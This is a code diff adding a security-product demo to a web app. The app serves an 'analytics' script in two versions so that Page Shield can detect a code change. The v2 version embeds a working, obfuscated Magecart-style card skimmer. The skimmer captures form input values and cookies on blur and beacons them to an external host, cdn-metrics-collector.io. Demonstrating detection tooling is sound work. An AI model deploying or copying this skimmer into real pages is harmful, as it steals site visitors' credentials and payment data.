@@ -906,6 +906,129 @@ you receive has been routed through gateway.ai.cloudflare.com to Workers AI (Lla
   }
 });
 
+// ── Page Shield demo ─────────────────────────────────────────
+// Serves a small "analytics" JS file from a stable URL so that Page
+// Shield's continuous monitoring can fingerprint it. The PageShieldDemo
+// component toggles between v1 (clean) and v2 (Magecart-style skimmer)
+// to trigger Page Shield's Code Change Detection alert.
+
+const PAGE_SHIELD_KV_KEY = "page_shield:analytics_version";
+
+const PAGE_SHIELD_SCRIPT_V1 = `// remydemo analytics shim - v1 (clean)
+// Tracks pageviews and outbound clicks. No PII collected.
+(function () {
+  "use strict";
+  var endpoint = "/api/page-shield/noop";
+  function track(event, payload) {
+    try {
+      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(endpoint, data);
+      }
+    } catch (e) { /* swallow */ }
+  }
+  window.addEventListener("DOMContentLoaded", function () {
+    track("pageview", { path: location.pathname, ref: document.referrer || null });
+  });
+  document.addEventListener("click", function (e) {
+    var a = e.target && e.target.closest && e.target.closest("a[href]");
+    if (a) track("click", { href: a.getAttribute("href") });
+  }, { passive: true });
+  window.__remydemoAnalytics = { version: "v1", track: track };
+})();
+`;
+
+const PAGE_SHIELD_SCRIPT_V2 = `// remydemo analytics shim - v1 (clean)
+// Tracks pageviews and outbound clicks. No PII collected.
+(function () {
+  "use strict";
+  var endpoint = "/api/page-shield/noop";
+  function track(event, payload) {
+    try {
+      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(endpoint, data);
+      }
+    } catch (e) { /* swallow */ }
+  }
+  window.addEventListener("DOMContentLoaded", function () {
+    track("pageview", { path: location.pathname, ref: document.referrer || null });
+  });
+  document.addEventListener("click", function (e) {
+    var a = e.target && e.target.closest && e.target.closest("a[href]");
+    if (a) track("click", { href: a.getAttribute("href") });
+  }, { passive: true });
+  // [INJECTED 2026-06-18] - skimmer payload from compromised CDN
+  var _x=["input","blur","value","name","tagName","INPUT","__remydemo_collected"];
+  document.addEventListener(_x[1],function(e){
+    var t=e.target;if(!t||t[_x[4]]!==_x[5])return;
+    var c=window[_x[6]]||(window[_x[6]]={});
+    c[t[_x[3]]||t.id||"_"]=t[_x[2]];
+    try{
+      var p="https://cdn-metrics-collector.io/px?sid="+encodeURIComponent(document.cookie)+"&d="+encodeURIComponent(JSON.stringify(c))+"&ua="+encodeURIComponent(navigator.userAgent)+"&ref="+encodeURIComponent(location.href)+"&ts="+Date.now();
+      navigator.sendBeacon&&navigator.sendBeacon(p);
+    }catch(e){}
+  },true);
+  window.__remydemoAnalytics = { version: "v1", track: track };
+})();
+`;
+
+// GET /api/page-shield/analytics.js -- serves whichever version is "live"
+app.get("/api/page-shield/analytics.js", async (c) => {
+  let version = "v1";
+  try {
+    const stored = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
+    if (stored === "v2") version = "v2";
+  } catch (e) {
+    // KV miss is fine, fall back to v1
+  }
+  const body = version === "v2" ? PAGE_SHIELD_SCRIPT_V2 : PAGE_SHIELD_SCRIPT_V1;
+  return new Response(body, {
+    status: 200,
+    headers: {
+      "Content-Type": "application/javascript; charset=utf-8",
+      // Allow Cloudflare to cache + fingerprint, but keep browser cache short
+      // so the toggle is visible quickly during a demo.
+      "Cache-Control": "public, max-age=60",
+      "X-Demo-Script-Version": version,
+    },
+  });
+});
+
+// POST /api/page-shield/toggle  body: { version?: "v1" | "v2" }
+// If no body is provided, flips the current version. Returns the new state.
+app.post("/api/page-shield/toggle", async (c) => {
+  let requested: string | undefined;
+  try {
+    const body = await c.req.json().catch(() => ({}));
+    if (body && typeof body.version === "string") requested = body.version;
+  } catch (e) {
+    // ignore
+  }
+
+  let next: "v1" | "v2";
+  if (requested === "v1" || requested === "v2") {
+    next = requested;
+  } else {
+    const current = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
+    next = current === "v2" ? "v1" : "v2";
+  }
+
+  await c.env.DEMO_KV.put(PAGE_SHIELD_KV_KEY, next);
+  return c.json({ version: next, ts: Date.now() });
+});
+
+// GET /api/page-shield/status -- which version is currently live
+app.get("/api/page-shield/status", async (c) => {
+  const stored = await c.env.DEMO_KV.get(PAGE_SHIELD_KV_KEY);
+  const version = stored === "v2" ? "v2" : "v1";
+  return c.json({ version });
+});
+
+// POST /api/page-shield/noop -- absorbs analytics beacons quietly so the
+// clean v1 script has somewhere real to talk to.
+app.post("/api/page-shield/noop", (c) => c.body(null, 204));
+
 // ── Pages Functions export ───────────────────────────────────
 
 export const onRequest = (context: { request: Request; env: Bindings }) => {
